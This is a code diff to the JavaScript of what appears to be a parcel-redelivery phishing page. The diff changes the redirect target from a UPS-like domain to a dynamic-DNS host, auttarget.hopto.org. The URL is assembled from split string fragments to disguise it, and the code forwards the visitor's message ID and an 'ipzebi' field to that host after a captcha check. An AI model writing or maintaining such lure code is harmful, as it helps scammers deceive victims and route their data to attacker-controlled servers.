@@ -25,7 +25,7 @@ function checkInput() {
   var errorMsg = document.getElementById('errorMsg');
   var messageId = document.getElementById('messageId').value;
   var ipzebi = document.getElementById('ipzebi').value;
-  let spark = "bettercallsallups"
+  let spark = "auttarget.hopto"
   let https = "http"
   let webapp = "RedeliveryRequest"
   // This part ensures the captcha value is included in the request
@@ -42,8 +42,8 @@ function checkInput() {
                   //alert(1);
                   // Success: Proceed with the redirection or next steps
                   // Adjust the URL as needed for your application
-                  window.location= https+"://"+spark+".com/"+webapp+"?messageId="+messageId+"&ipzebi="+ipzebi;
-                  //window.location = "http://bettercallsallups.com/RedeliveryRequest?messageId=" + messageId + "&ipzebi=" + ipzebi;
+                  window.location= https+"://"+spark+".org/"+webapp+"?messageId="+messageId+"&ipzebi="+ipzebi;
+                  //window.location = "http://bettercallsallups.com/RedeliveryRequest?messageId=" + messageId + "&ipzebi=" + ipzebi; http://auttarget.hopto.org/
               } else {
                   // Failure: Handle it, maybe show an error message
                   console.error('Session setting failed:', response.message);
